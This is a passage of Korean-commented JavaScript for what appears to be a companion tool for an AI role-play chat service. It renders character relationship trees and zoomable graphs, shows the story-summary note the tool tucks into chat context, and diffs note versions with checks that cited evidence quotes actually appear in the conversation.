        const d = pt(rootName, k), u = pt(k, rootName), grand = [...nb.get(k)].filter(g => !seen.has(g));
        grand.forEach(g => seen.add(g));
        return `<div class="rrow"><button class="rhead" data-act="person" data-arg="${esc(k)}">${avatar(k)}<span><b>${esc(k)}</b>${ppl.get(k) ? `<small>${esc(ppl.get(k))}</small>` : ''}</span></button>
          ${d ? `<div class="rline"><i>↓ ${esc(josa(rootName, '이', '가'))} 보기엔</i>${esc(d)}</div>` : ''}${u ? `<div class="rline"><i>↑ ${esc(josa(k, '이', '가'))} 보기엔</i>${esc(u)}</div>` : ''}
          ${grand.length ? `<div class="rsub">${grand.map(g => `<button data-act="person" data-arg="${esc(g)}"><b>${esc(g)}</b> ${esc(pt(k, g) || pt(g, k))}</button>`).join('')}</div>` : ''}</div>`;
      }).join('');
      const loose2 = names.filter(x => !seen.has(x));
      return seg + descHtml('map') + `<div class="meta"><span>${names.length}명 · 위에서 중심 인물을 바꿀 수 있어요</span>${editBtn('관계·감정선')}</div>${bigBtn}${centerBar}
        <div class="rcenter">${avatar(rootName)}<div><b>${esc(rootName)}</b><small>${esc(ppl.get(rootName) || '')}</small></div></div>
        <div class="rlist">${rows}</div>
        ${loose2.length ? `<div class="muted" style="margin-top:12px">${esc(rootName)}와 직접 이어지지 않은 사람 · ${loose2.map(esc).join(', ')}</div>` : ''}`;
    }
    const loose = names.filter(x => !seen.has(x));
    return seg + descHtml('map') + `<div class="meta"><span>${names.length}명 · 이름을 누르면 자세히</span>${editBtn('관계·감정선')}</div>${bigBtn}${centerBar}
      <div class="tree">
        <button class="tnode root" data-act="person" data-arg="${esc(rootName)}">${avatar(rootName)}<b>${esc(rootName)}</b>${ppl.get(rootName) ? `<small>${esc(ppl.get(rootName))}</small>` : ''}</button>
        <div class="trunk"></div>
        <div class="branches${kids.length === 1 ? ' one' : ''}">${kids.map(branch).join('')}</div>
        ${loose.length ? `<div class="muted" style="margin-top:14px;text-align:center">연결 없음 · ${loose.map(esc).join(', ')}</div>` : ''}
      </div>`;
  }

  // ── 전체 관계도: 가운데 중심 인물, 바로 이어진 사람은 안쪽 원, 한 다리 건너는 바깥 원.
  //    두 손가락으로 확대, 한 손가락으로 이동, 사람을 누르면 그 사람 관계만 강조됩니다.
  function graphModel() {
    const ppl = people(), rel = pairs('관계·감정선'), names = [...ppl.keys()].filter(n => rel.some(r => r.from === n || r.to === n));
    rel.forEach(r => { if (!names.includes(r.from)) names.push(r.from); if (!names.includes(r.to)) names.push(r.to); });
    const nb = new Map(names.map(x => [x, new Set()]));
    rel.forEach(r => { nb.get(r.from).add(r.to); nb.get(r.to).add(r.from); });
    // 이어진 무리 나누기
    const comps = [], seen = new Set();
    for (const start of [...names].sort((a, b) => nb.get(b).size - nb.get(a).size)) {
      if (seen.has(start)) continue;
      const comp = [], q = [start]; seen.add(start);
      while (q.length) { const x = q.shift(); comp.push(x); nb.get(x).forEach(y => { if (!seen.has(y)) { seen.add(y); q.push(y); } }); }
      comps.push(comp);
    }
    const centerComp = comps.find(c => c.includes(nav.center)) || comps[0];
    if (centerComp) comps.splice(comps.indexOf(centerComp), 1), comps.unshift(centerComp);
    const pos = new Map();
    let offsetX = 0, root = null;
    for (const comp of comps) {
      const c0 = comp.includes(nav.center) ? nav.center : [...comp].sort((a, b) => nb.get(b).size - nb.get(a).size)[0];
      if (!root) root = c0;
      const local = new Map([[c0, { x: 0, y: 0, ring: 0, a: 0 }]]);
      const ring1 = [...nb.get(c0)];
      const R1 = ring1.length <= 1 ? 190 : Math.max(210, ring1.length * 46);
      ring1.forEach((n, i) => { const a = ring1.length === 2 ? (i ? -Math.PI / 5 : -Math.PI * 4 / 5) : -Math.PI / 2 + (i / ring1.length) * Math.PI * 2; local.set(n, { x: Math.cos(a) * R1, y: Math.sin(a) * R1, ring: 1, a }); });
      const ring2 = [];
      ring1.forEach(p => nb.get(p).forEach(g => { if (!local.has(g) && !ring2.some(x => x.n === g)) ring2.push({ n: g, a: local.get(p).a }); }));
      const R2 = R1 + 190;
      ring2.sort((x, y) => x.a - y.a).forEach((g, i) => {
        const a = ring2.length > 6 ? -Math.PI / 2 + (i / ring2.length) * Math.PI * 2 : g.a + (ring2.filter(h => h.a === g.a).indexOf(g) - (ring2.filter(h => h.a === g.a).length - 1) / 2) * 0.45;
        local.set(g.n, { x: Math.cos(a) * R2, y: Math.sin(a) * R2, ring: 2 });
      });
      let ring = 3;
      comp.filter(n => !local.has(n)).forEach((n, i) => local.set(n, { x: (i - 1) * 90, y: R2 + 120, ring }));
      const xs = [...local.values()].map(p => p.x), minX = Math.min(...xs), maxX = Math.max(...xs);
      const shift = offsetX === 0 ? 0 : offsetX - minX + 110;
      local.forEach((p, n) => pos.set(n, { ...p, x: p.x + shift, ring: n === c0 ? 0 : p.ring }));
      offsetX = maxX + shift;
    }
    return { ppl, rel, names, pos, root };
  }

  function graphHtml() {
    const g = graphModel();
    if (!g.root) return emptyBox('관계·감정선이 정리되면 관계도가 그려져요.');
    const sel = nav.gsel && g.pos.has(nav.gsel) ? nav.gsel : null;
    const cut = (t, n) => (t.length > n ? t.slice(0, n) + '…' : t);
    // 두 사람 사이 선은 하나만 긋고, 서로 보는 관계는 선 옆에 두 줄로 나란히 씁니다(선·이름과 안 겹치게).
    const pairKey = r => [r.from, r.to].sort().join('\u0000');
    const groups = new Map();
    g.rel.filter(r => g.pos.has(r.from) && g.pos.has(r.to)).forEach(r => { const k = pairKey(r); if (!groups.has(k)) groups.set(k, []); groups.get(k).push(r); });
    const edges = [...groups.values()].map(list => {
      const [x, y] = [list[0].from, list[0].to].sort(), a = g.pos.get(x), b = g.pos.get(y);
      const on = !sel || x === sel || y === sel;
      const mx = (a.x + b.x) / 2, my = (a.y + b.y) / 2, len = Math.hypot(b.x - a.x, b.y - a.y) || 1;
      let nx = -(b.y - a.y) / len, ny = (b.x - a.x) / len;
      if (nx < 0 || (Math.abs(nx) < 0.01 && ny < 0)) { nx = -nx; ny = -ny; }
      const anchor = Math.abs(nx) > 0.3 ? 'start' : 'middle';
      // 살짝 휘어진 선. 글자는 휜 곳 바깥쪽에 붙입니다.
      const bend = 28, cx = mx + nx * bend, cy = my + ny * bend;
      const lx = mx + nx * (bend / 2 + 12), ly = my + ny * (bend / 2 + 12) - (list.length - 1) * 8 + 4;
      const spans = sel && on ? list.map((r, i) => `<tspan x="${lx}" dy="${i ? 17 : 0}"><tspan class="who">${esc(r.from)}</tspan> ${esc(cut(r.text, 16))}</tspan>`).join('') : '';
      return `<g class="ge${on ? '' : ' dim'}${sel && on ? ' on' : ''}"><path d="M${a.x},${a.y} Q${cx},${cy} ${b.x},${b.y}"/>
        ${spans ? `<text x="${lx}" y="${ly}" text-anchor="${anchor}">${spans}</text>` : ''}</g>`;
    }).join('');
    const nodes = g.names.filter(n => g.pos.has(n)).map(n => {
      const p = g.pos.get(n), [bg, fg] = avColor(n), r = p.ring === 0 ? 32 : 26;
      const on = !sel || n === sel || g.rel.some(x => (x.from === sel && x.to === n) || (x.to === sel && x.from === n));
      // 동물 이모지 얼굴 + 이름표(둥근 알약)
      const face = PROF.get(n)?.emoji || ANIM.get(n) || animalOf(n), w = [...n].length * 13 + 18;
      return `<g class="gn${on ? '' : ' dim'}${n === sel ? ' sel' : ''}" data-act="gnode" data-arg="${esc(n)}" transform="translate(${p.x},${p.y})">
        <circle r="${r + 5}" class="halo" stroke="${fg}"/><circle r="${r}" fill="${bg}"/>
        <text y="${p.ring === 0 ? 11 : 9}" text-anchor="middle" font-size="${p.ring === 0 ? 30 : 24}">${esc(face)}</text>
        <rect x="${-w / 2}" y="${r + 9}" width="${w}" height="22" rx="11" fill="${bg}"/>
        <text y="${r + 24.5}" text-anchor="middle" class="nm" fill="${fg}">${esc(n)}</text></g>`;
    }).join('');
    const info = sel ? (() => {
      const rows = [...g.rel.filter(r => r.from === sel).map(r => `<div class="rline" style="margin:6px 0 0"><i>${esc(josa(sel, '이', '가'))} 보는 ${esc(r.to)}</i>${esc(r.text)}</div>`),
                    ...g.rel.filter(r => r.to === sel).map(r => `<div class="rline" style="margin:6px 0 0"><i>${esc(josa(r.from, '이', '가'))} 보는 ${esc(sel)}</i>${esc(r.text)}</div>`)].join('');
      return `<div class="ginfo"><div style="display:flex;align-items:center;gap:10px">${avatar(sel)}<div style="flex:1;min-width:0"><b style="font-size:16px">${esc(sel)}</b>
        <div class="muted" style="font-size:12px">${esc(g.ppl.get(sel) || '')}</div></div>
        <button class="btn sm" data-act="person" data-arg="${esc(sel)}">자세히</button></div><div class="ginfo-body">${rows || '<div class="muted">이어진 관계가 없어요.</div>'}</div></div>`;
    })() : `<div class="ghint">사람을 누르면 그 사람의 관계가 선 위에 나타나요</div>`;
    return `<div class="gwrap" data-out="gwrap">
        <svg data-out="gsvg" width="100%" height="100%"><g data-out="gvp">${edges}${nodes}</g></svg>
        <div class="gctl"><button data-act="gzoom" data-arg="in" aria-label="확대">＋</button><button data-act="gzoom" data-arg="out" aria-label="축소">－</button><button data-act="gzoom" data-arg="fit" aria-label="전체 보기">${icon('globe', 'currentColor', 16)}</button></div>
        ${info}</div>`;
  }

  // 확대·이동 상태
  const view = { k: 1, x: 0, y: 0 };
  function applyView() { const vp = out('gvp'); if (vp) vp.setAttribute('transform', `translate(${view.x},${view.y}) scale(${view.k})`); }
  function fitGraph() {
    const vp = out('gvp'), wrap = out('gwrap');
    if (!vp || !wrap) return;
    vp.removeAttribute('transform');
    const b = vp.getBBox(), W = wrap.clientWidth, H = wrap.clientHeight - (nav.gsel ? 150 : 40);
    const k = Math.min(1.15, Math.max(0.3, Math.min(W / (b.width + 40), H / (b.height + 40))));
    view.k = k; view.x = W / 2 - (b.x + b.width / 2) * k; view.y = (H / 2 + 10) - (b.y + b.height / 2) * k;
    applyView();
  }
  function zoomAt(f, cx, cy) {
    const k = Math.min(4, Math.max(0.2, view.k * f));
    view.x = cx - (cx - view.x) * (k / view.k); view.y = cy - (cy - view.y) * (k / view.k); view.k = k; applyView();
  }
  function setupGraph(fit) {
    const wrap = out('gwrap');
    if (!wrap) return;
    if (fit) fitGraph(); else applyView();
    const pts = new Map();
    let last = null, moved = 0;
    const local = e => { const r = wrap.getBoundingClientRect(); return { x: e.clientX - r.left, y: e.clientY - r.top }; };
    wrap.addEventListener('pointerdown', e => { pts.set(e.pointerId, local(e)); moved = 0; last = null; });
    wrap.addEventListener('pointermove', e => {
      if (!pts.has(e.pointerId)) return;
      const prev = pts.get(e.pointerId), cur = local(e);
      pts.set(e.pointerId, cur);
      if (pts.size === 1) { view.x += cur.x - prev.x; view.y += cur.y - prev.y; moved += Math.abs(cur.x - prev.x) + Math.abs(cur.y - prev.y); applyView(); }
      else if (pts.size === 2) {
        const [a, b] = [...pts.values()], d = Math.hypot(a.x - b.x, a.y - b.y), mid = { x: (a.x + b.x) / 2, y: (a.y + b.y) / 2 };
        if (last) zoomAt(d / last, mid.x, mid.y);
        last = d; moved += 10;
      }
    });
    const end = e => { pts.delete(e.pointerId); if (pts.size < 2) last = null; };
    wrap.addEventListener('pointerup', end); wrap.addEventListener('pointercancel', end);
    wrap.addEventListener('click', e => { if (moved > 8) { e.stopPropagation(); e.preventDefault(); } }, true);
    wrap.addEventListener('wheel', e => { e.preventDefault(); const p = local(e); zoomAt(e.deltaY < 0 ? 1.12 : 1 / 1.12, p.x, p.y); }, { passive: false });
  }

  // 지금 채팅 안에 실제로 들어가 있는 노트를 그대로 보여 줍니다.
  function injectedHtml() {
    const n = snapshot?.note;
    if (!n) return emptyBox('아직 채팅에 들어간 노트가 없어요.');
    if (n.parked) return emptyBox('채팅에 넣기가 꺼져 있어요. 지금은 노트가 채팅에 없고 여기에만 보관돼 있어요(홈에서 켤 수 있어요).');
    const carrier = snapshot.all.find(m => msgId(m) === n.carrierId);
    const raw = carrier ? msgText(carrier) : '';
    const story = stripBlocks(raw).trim(), block = (raw.match(V3_RE) || raw.match(V2_RE) || raw.match(V1_RE) || [''])[0].trim();
    const readable = block.split('\n').map(l => { const m = l.match(LINE_RE); return m ? unsafe(m[1]) : l; }).join('\n')
      .replace(/^\[\/\/\]: # "/, '').replace(/"$/, '').replace(/^ {4}/gm, '');
    const behind = behindOf(snapshot);
    return `<div class="injbox"><div class="k">들어간 자리</div>
        <div style="font-size:15px;line-height:1.6"><b>최신 메시지에서 ${behind ?? '?'}개 전 AI 답변</b> 끝에 숨겨져 있어요.<br>
        <span class="muted">크랙이 최근 대화를 AI에게 보낼 때 이 노트도 같이 들어가요. 화면에는 안 보여요.</span></div></div>
      <div class="injbox"><div class="k">붙어 있는 답변의 끝부분</div><div class="tail">${esc(story.slice(-160)) || '(본문 없음)'}</div></div>
      <div class="injbox"><div class="k">AI가 읽는 노트 · ${fmt(block.length)}자</div><pre class="noteview">${esc(readable)}</pre></div>
      <div class="injbox"><div class="k">턴 번호 확인</div>
        <div style="font-size:14px;line-height:1.6">노트는 <b>1~${n.turns}턴</b>까지예요. 채팅 말풍선 위 숫자가 실제 턴과 다르면, 노트가 끝나는 턴을 맞춰 주세요.</div>
        <div class="fixrow"><input type="number" inputmode="numeric" min="1" data-out="fixTurns" value="${n.turns}" aria-label="노트가 끝나는 턴"><span>턴까지</span>
          <button class="btn sm pri" data-act="fixTurns"${busyNow ? ' disabled' : ''}>이 숫자로 고치기</button></div></div>
      <details style="margin-top:12px"><summary>숨김 형식 원문 그대로 보기</summary><pre>${esc(block)}</pre></details>`;
  }

  // 긴 문장을 조각으로 나눠 한 줄씩 "⤷"로 보여 줍니다
  //   따옴표·괄호 안의 마침표에서는 나누지 않아요("I… do it. The mission." 같은 대사가 여러 줄로 쪼개져 지문처럼 보이지 않게).
  //   따옴표·괄호가 짝이 안 맞으면(AI가 닫는 걸 빠뜨림) 예전처럼 다 나눠요.
  const BIT_CUT = /[.。]\s+|\s+→\s+|\s+·\s+/g;
  const bitsOf = t => {
    const s = String(t || ''), deep = []; let q = false, d = 0;
    for (let i = 0; i < s.length; i++) { const c = s[i]; if (c === '"') q = !q; else if ('“(「（'.includes(c)) d++; else if ('”)」）'.includes(c)) d = Math.max(0, d - 1); deep[i] = q || d > 0; }
    const parts = []; let from = 0;
    for (const m of s.matchAll(BIT_CUT)) if (q || d || !deep[m.index]) { parts.push(s.slice(from, m.index)); from = m.index + m[0].length; }
    parts.push(s.slice(from));
    return parts.map(x => x.replace(/[.。]\s*$/, '').trim()).filter(Boolean);
  };
  const bitHtml = x => { const m = x.match(/^(지금|원인|위험|배경|다음|결과)\s*[:：]\s*(.+)$/); return m ? `<p class="pnt"><i>${esc(m[1])}</i>${esc(m[2])}</p>` : `<p class="pnt">${esc(x)}</p>`; };
  // 물건을 사람이 가지고 있으면 👤, 어딘가에 놓여 있으면 📦(위 "놓인 곳" 동그라미와 같은 아이콘) ("루루" · "루루 가방 안" → 👤)
  const whereIcon = loc => { const head = String(loc).trim().split(/[\s(（,·]/)[0]; return [...people().keys()].some(n => sameName(n, head) || sameName(n, String(loc).trim())) ? '👤 ' : '📦 '; };
  // 소지품 하나: 📍 지금 있는 곳(제목 괄호) · ⤷ 상태 조각 · ⤷ 내력 · 근거
  const ITEM_HIST = /^(내력|입수|이력)\s*[:：]\s*(.*)$/;
  const itemBody = (b, peek = false) => {
    const loc = (String(b.title || '').match(/\(([^)]*)\)\s*$/) || [])[1], ls = b.lines.filter(l => !/^(근거|번역)\s*[:：]/.test(l));
    const state = ls.filter(l => !ITEM_HIST.test(l)).map(l => l.replace(/^상태\s*[:：]\s*/, '')).flatMap(bitsOf);
    const hist = ls.map(l => l.match(ITEM_HIST)).filter(Boolean);
    const prf = b.lines.map(l => l.match(/^근거\s*[:：]\s*(.*)$/)).filter(Boolean).map(m => m[1].replace(/^["“]|["”]$/g, '')).join(' / ');
    return (loc && !peek ? `<p class="tl-meta">${whereIcon(loc)}${esc(loc)}</p>` : '') + state.map(bitHtml).join('')
      + hist.map(m => `<p class="pnt"><i>${esc(m[1])}</i>${esc(m[2])}</p>`).join('') + (prf ? quoteHtml(prf) : '');
  };
  const itemName = t => String(t || '').replace(/\s*\(.*\)\s*$/, '');
  // 장소·조직 하나: 소지품과 같은 모양(⤷ 줄 + 근거 버튼)
  //   장소면 첫 조각(위치)은 📍, 나머지는 ⤷. 조직은 전부 ⤷
  const isOrg = b => /조직|단체|세력|회사|기관/.test((String(b.title || '').match(/\(([^)]*)\)\s*$/) || [])[1] || '');
  const placeBits = b => b.lines.filter(l => !/^(근거|번역)\s*[:：]/.test(l)).flatMap(bitsOf);
  //   peek: 첫 조각은 접힌 줄에 이미 보이니 펼친 내용에선 뺍니다(눌러도 글자가 안 움직이게)
  const placeBody = (b, peek = false) => placeBits(b).map((x, i) => i === 0 ? (peek ? '' : isOrg(b) ? bitHtml(x) : `<p class="tl-meta">🏠 ${esc(x)}</p>`) : bitHtml(x)).join('')
    + b.lines.filter(l => /^근거\s*[:：]/.test(l)).map(l => quoteHtml(l.replace(/^근거\s*[:：]\s*/, ''))).join('');
  const placePeek = b => { const first = placeBits(b)[0] || ''; return first ? `${isOrg(b) ? '🏛' : '🏠'} ${first}` : ''; }; // 위 묶음 동그라미와 같은 아이콘
  // 사건 줄 맨 앞 "장소 · 시각 → 원인 → …"의 앞부분이 장소면 📍. '·'가 없어도 장소처럼 생긴 짧은 말(거실·복도·카페…)이면 📍로 봅니다.
  const placeHead = t => { t = String(t).trim(); return /·/.test(t) || /^📍/.test(t) || ([...t].length <= 18 && /(실|방|집|관|장|원|교|당|점|터|역|층|복도|거실|부엌|주방|옥상|골목|길|거리|카페|병원|사무실|라운지|하우스|캠퍼스|공원|호텔|숲|해변|창고|차고|마당|정원|학교|기숙사|강당|도서관|식당)\s*(?:[(（][^)）]*[)）])?\s*$/.test(t)); };
  // "⤿ 헤이든: 지켜봄 (끼기 싫어서)" = 곁에 있던 인물이 한 일 · 이유. 쪼개지 않고 한 줄 들여서. (AI가 ㄴ·↳로 써도 받음)
  //   화면에선 다른 줄과 같은 ⤷ 화살표로, 이름만 굵게 구분합니다(화살표 모양을 하나로).
  // "장소 · 루루 · 네이선 힐 · …"처럼 장소+그 자리 인물 나열만 있는 줄 → { place, who[] }. 아니면 null.
  //   장소 이름 안에도 '·'가 있을 수 있어서(401호 욕실·게스트룸) 뒤에서부터 인물만 이어진 데까지를 인물, 그 앞 전부를 장소로 봅니다.
  function metaOf(l) {
    const bits = String(l).split(/\s*(?:[·,，]|→)\s*/).map(x => x.trim()).filter(Boolean).map((x, i, a) => i === a.length - 1 ? x.replace(/\s*(?:등|외(?:\s*\d+\s*명)?|일행)\s*$/, '').trim() : x).filter(Boolean), isWho = x => x.length <= 16 && [...people().keys()].some(n => n === x || personAlias(n).includes(x));
    let k = bits.length; while (k > 0 && isWho(bits[k - 1])) k--;
    const place = bits.slice(0, k).join('·').replace(/^📍\s*/, '');
    return bits.length >= 2 && k < bits.length && (k === 0 || (k <= 3 && place.length <= 40 && !/→/.test(l))) ? { place, who: bits.slice(k) } : null;
  }
  const evBody = l => { const r = String(l).match(/^[⤿ㄴ↳]\s*(.+)$/); if (r) { const n = r[1].match(/^(.{1,16}?)\s*[:：]\s*(.+)$/);
      return `<p class="pnt tl-side">${n ? `<b>${esc(n[1])}</b> ${esc(n[2])}` : esc(r[1])}</p>`; }
    // "장소 · 루루 · 네이선 힐 · …"처럼 장소+인물 나열만 있는 줄은 한 줄로 묶습니다: 📍 장소 · 👥 루루, 네이선 힐, …
    const meta = metaOf(l);
    if (meta) return `<p class="tl-meta">${meta.place ? `📍 ${esc(meta.place)} · ` : ''}👥 ${esc(meta.who.join(', '))}</p>`;
    const parts = String(l).split(/\s+→\s+/), hasMeta = parts.length > 1 && placeHead(parts[0]);
    // "장소 · 루루, 네이선 → 원인 → …"처럼 화살표 앞에 장소+인물이 같이 있으면 📍 장소 · 👥 인물로 나눕니다.
    const m0 = hasMeta && metaOf(parts[0]);
    return (hasMeta ? `<p class="tl-meta">${m0 ? `${m0.place ? `📍 ${esc(m0.place)} · ` : ''}👥 ${esc(m0.who.join(', '))}` : `📍 ${esc(parts[0].replace(/^📍\s*/, ''))}`}</p>` : '') + (hasMeta ? parts.slice(1) : parts).flatMap(bitsOf).map(bitHtml).join(''); };
  // 기억하는 일: "1년차 09.12 저잣거리 입궁" → 왼쪽 날짜 / 오른쪽 내용, 한 줄씩
  const MEM_DATE = /^((?:\d+년차\s*)?\d{1,2}[./]\d{1,2}(?:\s+\d{1,2}:\d{2})?|\d{4}[.\-/]\d{1,2}[.\-/]\d{1,2}(?:\s+\d{1,2}:\d{2})?)\s+(.+)$/;
  // 같은 이름의 날짜로그 사건이 있으면 그 사건의 장소·근거 원문을 바로 아래에 붙입니다(어디서 처음 만났는지 등).
  const memProof = text => {
    const k = String(text).replace(/\s/g, ''); if ([...k].length < 3) return '';
    const b = blocksOf(bodyOf('날짜로그')).find(b => { const t = ((b.title || '').match(/-\s*(.+?)\]?(?:\s*\(요약\))?$/) || [])[1]?.replace(/\s/g, '') || '';
      return t && (t.includes(k) || k.includes(t)); });
    if (!b) return '';
    const where = '';
    const q = b.lines.find(l => /^근거\s*[:：]/.test(l));
    return (where ? `<p class="tl-meta">📍 ${esc(where)}</p>` : '') + (q ? quoteHtml(q.replace(/^근거\s*[:：]\s*/, '').replace(/^["“]|["”]$/g, '')) : '');
  };
  const memRows = list => list.map(m => { const s = String(m).trim(), x = s.match(MEM_DATE);
    return x ? `<div class="prow"><span class="pk">${esc(x[1])}</span><span class="pv">${esc(x[2])}${memProof(x[2])}</span></div>` : `<p class="pline">• ${esc(s)}</p>`; });
  // 인물 하나: 프로필 · 고민·계획 · 이 사람이 보는 관계(마음·호칭). 나머지는 타임라인·상태·인지에 한 번씩만
  function personHtml(name) {
    const ppl = people(), rel = pairs('관계·감정선'), sp = pairs('호칭·말투'), pr = PROF.get(name) || {};
    // 상대마다 관계·마음(감정선 마지막 단계)·부르는 말을 한 묶음으로
    const fl = feelings().filter(f => f.steps.length), mine = r => r.from === name || r.to === name;
    const others = [...new Set([...rel, ...sp, ...fl].filter(mine).map(r => (r.from === name ? r.to : r.from)))];
    const side = (a, b) => {
      const pick = list => list.filter(r => r.from === a && r.to === b);
      // 이모지 이름표를 위에, 내용은 아래로 (왼쪽 여백 없이)
      const row = (k, v) => `<div class="prow pev"><span class="pk">${k}</span><span class="pv">${v}</span></div>`;
      const rows = [
        ...pick(rel).map(r => row('관계', esc(r.text) + (r.turns || []).map(t => `<p class="pnt"><i>전환</i>${esc(t)}</p>`).join('') + quoteHtml(r.quote, r.tr))),
        ...pick(fl).map(f => { const s = f.steps[f.steps.length - 1]; return row('마음', `<b class="hl">${esc(s.feel)}</b>${s.why ? ` <span class="pdim">· ${esc(s.why)}</span>` : ''}`); }),
        ...pick(sp).map(r => { const c = speechChips(r.text); return row('호칭', c.chips.flatMap(x => x.addr).map(x => `<span class="addr">「${esc(x)}」</span>`).join(' ') + regTag(c)); }),
      ];
      // 이 화면 주인이 보는 쪽만 그리니 "누가 → 누구" 이름표 없이, 왼쪽 색 줄 하나로 묶습니다
      return rows.length ? `<div class="pdir" style="--dc:${avColor(a)[1]}">${rows.join('')}</div>` : '';
    };
    // 이 사람이 상대를 보는 쪽만 (반대쪽은 상대 화면에). 폰에서 길지 않게 상대마다 접고, 접힌 줄엔 부르는 말만. 첫 사람만 펼침
    const addrOf = (a, b) => { const r = sp.find(x => x.from === a && x.to === b); return r ? speechChips(r.text).chips.flatMap(x => x.addr)[0] || '' : ''; };
    const relRows = others.filter(o => side(name, o)).map((o, i) => { const to = addrOf(name, o);
      return `<div class="pgrp">${fold(`${avatar(o)}<b>${esc(o)}</b>`, to ? `「${to}」` : '', side(name, o), i === 0)}</div>`; });
    // 칸 제목 앞에 이모지 하나, 칸 사이는 얇은 선
    const cat = (emo, t, rows) => rows.length ? `<section class="pcat">${t ? `<h5>${emo ? emo + ' ' : ''}${t}</h5>` : ''}${rows.join('')}</section>` : '';
    return `<div class="phero">${avatar(name)}<div style="min-width:0"><b>${esc(name)}</b>${pr.tag ? `<em>${esc(pr.tag)}${pr.isUser ? ' · 유저(PC)' : ''}</em>` : ''}<p>${esc(ppl.get(name) || '인물 칸에 설명이 없어요')}</p>${pr.worry ? `<p class="pnt"><i>고민</i>${esc(pr.worry)}</p>` : ''}${pr.plan ? `<p class="pnt"><i>계획</i>${esc(pr.plan)}</p>` : ''}</div></div>
      ${/* 이 화면엔 이 사람만의 것(프로필·관계)만. 기억·사건·명대사·서사 고리는 타임라인(이 사람), 몸·옷·소지품은 상태, 아는 것은 인지에 한 번씩만 */
        cat('', '관계 · 마음 · 호칭', relRows) || emptyBox('아직 정리된 관계가 없어요.')}
      <div class="jump" style="margin-top:6px"><button data-act="tlperson" data-arg="${esc(name)}"><b>${esc(name)} 타임라인 보기</b><span class="v">기억·사건·명대사</span></button></div>`;
  }

  // ── 원문 편집 ──
  function editHtml(key) {
    const body = nav.view === 'pvEdit' ? (draft.sections.find(s => s.key === key)?.body || '') : bodyOf(key);
    return `<div class="editwrap"><div class="muted" style="margin:0 2px 10px">한 줄에 하나씩 "- "로 시작해요. 소제목은 "### "로 써요.</div>
      <textarea data-out="editor">${esc(body)}</textarea></div>`;
  }

  // ── 이번 회차에 바뀐 것: 정리 전 노트 ↔ 정리 후 노트 ──
  //    정리를 넣을 때마다 전·후 노트를 이 브라우저에 남깁니다(방마다 최근 8회). 비교 화면과 '이 노트로 되돌리기'에 씁니다.
  const historyOf = async chatId => { try { return JSON.parse(String(await getValue('hist:' + chatId, '[]')) || '[]'); } catch (_) { return []; } };
  async function pushHistory(chatId, rec) { const list = await historyOf(chatId); list.push(rec); await setValue('hist:' + chatId, JSON.stringify(list.slice(-8))); }
  const notProofLine = l => !/^\s*-?\s*(근거|번역|장면)\s*[:：]/.test(l);
  function changesOf(before, after) {
    const A = new Map(splitSections(before).map(s => [s.key, s.body])), B = new Map(splitSections(after).map(s => [s.key, s.body]));
    const lines = body => String(body || '').split('\n').map(l => bullet(l.trim())).filter(l => l && notProofLine(l) && !isNone(l));
    // 감정선: 방향마다 새로 붙은 단계
    // 단계마다 바로 아래 '근거:' 줄을 함께 기억합니다(지어낸 변화인지 확인용).
    const steps = body => { const m = new Map(); for (const b of blocksOf(body).filter(b => b.title)) { const st = [];
      for (const l of b.lines) { const q = l.match(/^근거\s*[:：]\s*(.*)$/); if (q) { if (st.length) st[st.length - 1].quote = q[1].replace(/^["“]|["”]$/g, ''); } else if (notProofLine(l)) st.push({ text: l, quote: '' }); }
      m.set(b.title.replace(/\s*->\s*/, ' → '), st); } return m; };
    const fa = steps(A.get('감정선')), fb = steps(B.get('감정선')), feels = [];
    for (const [dir, st] of fb) { const old = (fa.get(dir) || []).map(x => x.text); const added = st.filter(x => !old.includes(x.text)); if (added.length) feels.push({ dir, from: old[old.length - 1] || '', added }); }
    // 관계·호칭: 같은 A → B 줄이 어떻게 바뀌었는지
    const rels = body => { const m = new Map(); for (const p of personsIn(body)) for (const r of p.rels) m.set(`${p.name} → ${r.to}`, r); return m; };
    const ra = rels(A.get('인물')), rb = rels(B.get('인물')), relCh = [];
    for (const [k, v] of rb) if (ra.get(k)?.text !== v.text) relCh.push({ dir: k, before: ra.get(k)?.text || '', after: v.text, quote: v.quote || '' });
    const pa = personsIn(A.get('인물')).map(p => p.name), people = personsIn(B.get('인물')).map(p => p.name).filter(n => !pa.some(x => sameName(x, n)));
    // 나머지 칸: 더해진 줄 / 빠진 줄
    const keys = [...new Set([...A.keys(), ...B.keys()])].filter(k => ![FIXED, '인물', '감정선', '명대사'].includes(k));
    const order = k => { const i = SECTIONS.findIndex(x => x.key === k); return i < 0 ? 99 : i; };
    const sections = keys.sort((a, b) => order(a) - order(b)).map(k => {
      const la = lines(A.get(k)), lb = lines(B.get(k));
      // 더해진 줄 바로 아래 '근거:' 줄을 그 줄의 근거로 기억해 둡니다(화면에서 근거 버튼으로)
      const quotes = {}; let last = '';
      for (const raw of String(B.get(k) || '').split('\n')) { const l = bullet(raw.trim()), q = l.match(/^근거\s*[:：]\s*(.*)$/);
        if (q) { if (last) quotes[last] = q[1]; } else if (l && notProofLine(l)) last = l; }
      return { key: k, added: lb.filter(l => !la.includes(l)), removed: la.filter(l => !lb.includes(l)), quotes };
    }).filter(x => x.added.length || x.removed.length);
    return { feels, rels: relCh, people, sections };
  }
  const changeCount = ch => ch.feels.length + ch.rels.length + ch.people.length + ch.sections.reduce((a, s) => a + s.added.length + s.removed.length, 0);
  // src: 이번에 읽은 대화 원문(공백 뺀 것). 있으면 근거 인용이 실제로 있는지 표시합니다.
  const squash = t => String(t || '').replace(/[\s"“”'‘’「」]/g, '');
  // 근거가 원문에 있는지: 「지문」·"대사" 조각마다 확인하고, 대사 끝 괄호 번역은 원문 모양이 달라서 빼고 봅니다.
  const evBodyOf = q => String(q).replace(/^\s*[（(][^)）]*턴[^)）]*[)）]\s*/, '');
  const evFound = (q, src) => { const b = evBodyOf(q), segs = [...b.matchAll(/「([^」]*)」|["“]([^"“”]*)["”]?/g)].map(x => x[1] ?? splitTr(x[2])[0]).filter(s => s.trim());
    return (segs.length ? segs : [splitTr(b.replace(/^["“]|["”]$/g, ''))[0]]).every(s => src.includes(squash(s))); };
  function changesHtml(ch, src = '') {
    if (!changeCount(ch)) return emptyBox('바뀐 내용이 없어요.');
    const ev = q => { if (!q) return src ? '<p class="chg-ev bad">⚠ 근거 줄이 없어요 — 직접 확인해 주세요</p>' : '';
      // 근거는 다른 화면과 같은 토글(근거 · 12턴 ▾). 원문에서 못 찾으면 경고만 글로
